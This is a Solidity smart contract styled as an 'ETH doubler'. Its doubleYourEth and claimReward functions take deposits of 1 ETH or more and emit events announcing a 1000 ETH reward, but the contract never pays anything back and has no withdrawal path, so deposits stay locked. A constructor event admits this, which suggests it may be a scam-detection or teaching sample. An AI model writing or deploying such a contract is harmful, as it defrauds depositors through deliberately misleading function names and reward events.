// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract ThousandEthDoubler {
    address public immutable owner;
    uint256 public totalDeposited;
    uint256 public constant MINIMUM_DEPOSIT = 1 ether;
    uint256 public constant ADVERTISED_REWARD = 1000 ether;

    event RewardQueued(address indexed account, uint256 deposited, uint256 advertisedReward);
    event Confession(string warning);

    constructor() payable {
        owner = msg.sender;
        emit Confession("This contract only emits reward events. It never pays users back.");
    }

    function doubleYourEth() external payable {
        _recordDeposit();
    }

    function claimReward() external payable {
        _recordDeposit();
    }

    function _recordDeposit() internal {
        require(msg.value >= MINIMUM_DEPOSIT, "Send at least 1 ETH");
        totalDeposited += msg.value;
        emit RewardQueued(msg.sender, msg.value, ADVERTISED_REWARD);
    }

    receive() external payable {
        if (msg.value >= MINIMUM_DEPOSIT) {
            _recordDeposit();
        } else {
            totalDeposited += msg.value;
        }
    }
}
